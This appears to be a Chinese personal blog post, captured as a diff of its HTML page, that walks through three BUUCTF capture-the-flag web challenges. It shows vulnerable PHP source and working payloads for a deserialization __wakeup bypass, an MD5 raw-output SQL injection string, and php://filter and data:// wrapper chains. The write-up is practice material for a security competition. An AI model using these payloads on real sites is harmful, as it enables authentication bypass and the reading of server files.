@@ -1,0 +1,490 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言全国大学生信息安全竞赛线上赛5.28~5.2开始，现在还啥都不会……要快点开始刷题了，不过突然发现以前的题很简单了 [极客大挑战 2019]PHP题目说因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 不愧是我！！！ 扫一下有个www.zip泄露，里面比较重要的是class.php和index.phpclass.php 123456789101112131415161718192">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu刷题-5.9">
+<meta property="og:url" content="http://gofervor.com/2022/05/09/buu%E5%88%B7%E9%A2%98-5.9/index.html">
+<meta property="og:site_name" content="b1ub1u的小站">
+<meta property="og:description" content="前言全国大学生信息安全竞赛线上赛5.28~5.2开始，现在还啥都不会……要快点开始刷题了，不过突然发现以前的题很简单了 [极客大挑战 2019]PHP题目说因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 不愧是我！！！ 扫一下有个www.zip泄露，里面比较重要的是class.php和index.phpclass.php 123456789101112131415161718192">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/sy51jv_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/sy538m_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbhsq_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbicf_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tvk3m7_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsblwz_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbre5_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbjer_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbnua_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbkt9_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/xmkzty_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/xml057_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/xmkz01_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/xml3d8_0.png">
+<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/xmkz01_0.png">
+<meta property="article:published_time" content="2022-05-09T09:45:51.000Z">
+<meta property="article:modified_time" content="2022-05-09T12:41:38.161Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://81.70.101.23:11111/i/2022/05/09/sy51jv_0.png">
+  
+  
+  <title>buu刷题-5.9 - b1ub1u的小站</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"gofervor.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>biubiu~</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpeg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="buu刷题-5.9">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-05-09 17:45" pubdate>
+        2022年5月9日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.8k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">buu刷题-5.9</h1>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>全国大学生信息安全竞赛线上赛5.28~5.2开始，现在还啥都不会……<br>要快点开始刷题了，不过突然发现以前的题很简单了</p>
+<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>题目说<code>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 不愧是我！！！ </code><br>扫一下有个<a target="_blank" rel="noopener" href="http://www.zip泄露,里面比较重要的是class.php和index.php/">www.zip泄露，里面比较重要的是class.php和index.php</a><br>class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>所以就是打反序列化啦<br><img src="http://81.70.101.23:11111/i/2022/05/09/sy51jv_0.png" srcset="/img/loading.gif" lazyload><br>这里主要考察两点<br>一是private变量序列化时那个不可见字符是%00，占一个字节<br>二是绕过__wakeup魔术方法把类中变量数目比正常的多，比如3、4、5…都行</p>
+<p>payload: <code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></p>
+<p><img src="http://81.70.101.23:11111/i/2022/05/09/sy538m_0.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>初始界面是个提交框，输入什么都没有回显，<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbhsq_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>用burp抓包放包后看见hint<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbicf_0.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>select * from &#39;admin&#39; where password=md5($pass,true)</code><br>这里有两个不知道的知识点：</p>
+<p>一是md5函数当选定true模式后返回的是十六进制数据<br>比如<img src="http://81.70.101.23:11111/i/2022/05/09/tvk3m7_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>二是ffifdyop这个字符串md5的十六进制值是’or’6xxxxxx，所以构造后就是<code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6xxxxxx&#39;</code>恒真式，类似SQL注入</p>
+<p>可以看到这里指向到levels91.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsblwz_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbre5_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>简单的md5数组绕过，又指向到levell14.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbjer_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbnua_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>还是一样的数组绕过，得到flag<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbkt9_0.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>进入题目是源代码<br><img src="http://81.70.101.23:11111/i/2022/05/09/xmkzty_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一个if判断可以用data伪协议<br>然后用filter伪协议配合源码里的include()函数读取useless.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/xml057_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>base64解密后得到useless.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/xmkz01_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后源码里unserialize函数可以利用反序列化漏洞读取flag.php<br>由于file_get_contents类似于include，稳妥起见依然可以用filter协议配合base64</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-comment">//O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>最终payload：?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;}<br><img src="http://81.70.101.23:11111/i/2022/05/09/xml3d8_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>base64解密后得到flag<br><img src="http://81.70.101.23:11111/i/2022/05/09/xmkz01_0.png" srcset="/img/loading.gif" lazyload></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/06/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF%E6%A0%A1%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
+                        <span class="hidden-mobile">中国海洋大学CTF校赛复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>hexo</span></a> <i class="iconfont icon-love"></i> <a href="http://www.gofervor.com/" target="_blank" rel="nofollow noopener"><span>b1ub1u</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        皖ICP备2021017950号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/containsWord.min.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/nico.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
